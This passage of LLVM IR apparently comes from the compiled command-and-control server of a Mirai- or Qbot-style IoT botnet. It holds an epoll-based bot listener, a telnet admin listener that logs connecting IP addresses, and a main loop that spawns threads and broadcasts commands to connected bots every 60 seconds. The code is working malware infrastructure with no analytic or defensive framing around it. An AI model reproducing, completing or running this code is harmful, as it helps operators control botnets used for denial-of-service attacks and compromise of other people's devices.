  %601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %602 = load i32, i32* %5, align 4
  %603 = getelementptr inbounds [80 x i8], [80 x i8]* %11, i64 0, i64 0
  call void @broadcast(i8* %601, i32 %602, i8* %603)
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %604, i8 0, i64 2048, i1 false)
  br label %191, !llvm.loop !27

605:                                              ; preds = %191
  br label %606

606:                                              ; preds = %605, %576, %560, %554, %497, %314, %306, %298, %290, %282, %274, %266, %258, %250, %183, %168, %157, %156, %137, %131, %97, %91
  %607 = load i32, i32* %5, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %608
  %610 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %609, i32 0, i32 3
  store i32 0, i32* %610, align 4
  %611 = load i32, i32* %5, align 4
  %612 = call i32 @close(i32 %611)
  %613 = load i32, i32* %4, align 4
  %614 = add nsw i32 %613, -1
  store i32 %614, i32* %4, align 4
  %615 = load i8*, i8** %2, align 8
  ret i8* %615
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #9
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #10
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.84, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #10
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %28, %68
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.85, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.86, i64 0, i64 0), i32 %43, i32 %48, i32 %53, i32 %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 %62, %struct.sockaddr* %63, i32* %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.87, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %71) #10
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %16 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 4
  br i1 %18, label %19, label %25

19:                                               ; preds = %3
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i8**, i8*** %6, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.88, i64 0, i64 0), i8* %23)
  call void @exit(i32 1) #11
  unreachable

25:                                               ; preds = %3
  %26 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.90, i64 0, i64 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @fileFD, align 8
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 3
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %10, align 4
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp sgt i32 %35, 850
  br i1 %36, label %37, label %39

37:                                               ; preds = %25
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.91, i64 0, i64 0))
  ret i32 0

39:                                               ; preds = %25
  %40 = load i32, i32* %10, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.92, i64 0, i64 0), i32 %40)
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @create_and_bind(i8* %44)
  store volatile i32 %45, i32* @listenFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %49

48:                                               ; preds = %39
  call void @abort() #11
  unreachable

49:                                               ; preds = %39
  %50 = load volatile i32, i32* @listenFD, align 4
  %51 = call i32 @make_socket_non_blocking(i32 %50)
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

54:                                               ; preds = %49
  call void @abort() #11
  unreachable

55:                                               ; preds = %49
  %56 = load volatile i32, i32* @listenFD, align 4
  %57 = call i32 @listen(i32 %56, i32 4096) #10
  store i32 %57, i32* %8, align 4
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

60:                                               ; preds = %55
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i64 0, i64 0))
  call void @abort() #11
  unreachable

61:                                               ; preds = %55
  %62 = call i32 @epoll_create1(i32 0) #10
  store volatile i32 %62, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @epollFD, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

65:                                               ; preds = %61
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.94, i64 0, i64 0))
  call void @abort() #11
  unreachable

66:                                               ; preds = %61
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  store i32 %67, i32* %69, align 1
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %70, align 1
  %71 = load volatile i32, i32* @epollFD, align 4
  %72 = load volatile i32, i32* @listenFD, align 4
  %73 = call i32 @epoll_ctl(i32 %71, i32 1, i32 %72, %struct.epoll_event* %11) #10
  store i32 %73, i32* %8, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

76:                                               ; preds = %66
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  call void @abort() #11
  unreachable

77:                                               ; preds = %66
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %78, 2
  %80 = zext i32 %79 to i64
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %14, align 8
  %82 = alloca i64, i64 %80, align 16
  store i64 %80, i64* %15, align 8
  br label %83

83:                                               ; preds = %87, %77
  %84 = load i32, i32* %9, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %9, align 4
  %86 = icmp ne i32 %84, 0
  br i1 %86, label %87, label %93

87:                                               ; preds = %83
  %88 = load i32, i32* %9, align 4
  %89 = add nsw i32 %88, 1
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i64, i64* %82, i64 %90
  %92 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #10
  br label %83, !llvm.loop !28

93:                                               ; preds = %83
  %94 = getelementptr inbounds i64, i64* %82, i64 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = inttoptr i64 %96 to i8*
  %98 = call i32 @pthread_create(i64* %94, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %97) #10
  br label %99

99:                                               ; preds = %100, %93
  br label %100

100:                                              ; preds = %99
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.95, i64 0, i64 0))
  %101 = call i32 @sleep(i32 60)
  br label %99
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #10
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.97, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #10
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #10
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !29

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.99, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #10
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #4

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind readnone willreturn }
attributes #10 = { nounwind }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
